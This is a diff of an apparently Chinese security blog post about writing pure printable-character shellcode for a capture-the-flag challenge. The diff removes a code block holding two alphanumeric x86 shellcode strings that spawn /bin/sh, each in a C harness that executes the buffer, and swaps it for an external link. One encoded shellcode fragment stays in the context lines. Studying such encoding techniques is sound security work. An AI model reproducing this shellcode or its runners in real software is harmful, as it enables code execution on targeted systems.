@@ -29,7 +29,8 @@ tags : [ 技术相关 ,汇编+bin, ShellCode ]
 ## 纯字符ShellCode
 从题目描述可以得知，实际上这个题目的考点并不是软件类漏洞的利用，反而是对shellcode有一些极端的要求限制，当你通过了这些限制之后，自然就得到了执行条件。在这些限制条件中最难达到的其实就是纯字符的ShellCode了。  
 
-对于纯可视字符类ShellCode的探索，网上也有过非常多的文章，国内比较好的文章有这样几篇：
+对于纯可视字符类ShellCode的探索，网上也有过非常多的文章，国内比较好的文章有这样几篇：  
+
 > [<<纯字母shellcode揭秘>>](http://bbs.pediy.com/showthread.php?t=113177)  
 > [<<纯字符数字的shllcode及Alpha2.c使用>>](http://blog.csdn.net/instruder/article/details/6050048)  
 > [<<纯ascii的shellcode编写>>](http://blog.csdn.net/v_ling_v/article/details/42824007)
@@ -75,41 +76,7 @@ PYVTX10X41PZ41H4A4I1TA71TADVTZ32PZNBFZDQC02DQD0D13DJE1D485C3E1YKM6L7L0
 ## 字符型 ShellCode 样例
 这里有两段从他人博客找到的 ShellCode 样例：
 
-<code>
-//#######################################################################  
-//             Length: 258 Bytes    /bin/sh  
-//         http://www.securityfocus.com/archive/82/466792/30/180/threaded
-//#######################################################################  
-\#include\<stdio.h>  
-char buf[] =   
-"hAAAAX5AAAAHPPPPPPPPah4A00X5ZnCXPh0A00X50nRYPTYIII19hAA00X5Vb00PTY1"  
-"9hA0A0X5fpsOPTY19II19I19h0AA0X5OpeFPTY19II19I19h004AX5Bf8sPTY19I19I"  
-"I19h4040X58Bz8PTYII19h4520X58z9FPTY19I19I19I19h0000X5v7FvPTYI19I19h"  
-"0AE0X58pzGPTY19II19hE000X5ZnFFPTYI19I19h555AX5ZZZUPTY19T\xc3";    
-int main(){  
-    fprintf(stdout,"Length: %d\n",strlen(buf));  
-    (\*(void(\*)()) buf)();  
-    return 0;  
-}  
-
-//#######################################################################  
-//             Length: 147 Bytes    /bin/sh  
-//       http://blog.csdn.net/v_ling_v/article/details/42824007  
-//#######################################################################  
-\#include\<stdio.h>  
-char buf[] =   
-"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HM"  
-"IQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHE"  
-"P0WQCK9KQ8MK0AA";  
-
-int main (){  
-    fprintf(stdout,"Length: %d\n",strlen(buf));  
-    (\*(void(\*)()) buf)();   
-    return 0;  
-}  
-
-
-</code>
+[http://rootkiter.com/files/shellcode.txt](http://rootkiter.com/files/shellcode.txt)
 
 
 ## 结个尾
